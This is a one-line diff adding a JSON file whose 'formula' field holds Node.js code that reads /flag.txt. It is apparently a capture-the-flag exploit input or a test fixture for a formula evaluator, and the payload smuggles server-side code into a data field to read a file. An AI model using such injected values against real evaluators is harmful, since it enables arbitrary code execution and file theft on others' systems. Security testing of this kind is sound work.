@@ -1,0 +1,1 @@
+{"formula":"require('fs').readFileSync('/flag.txt').toString();"}
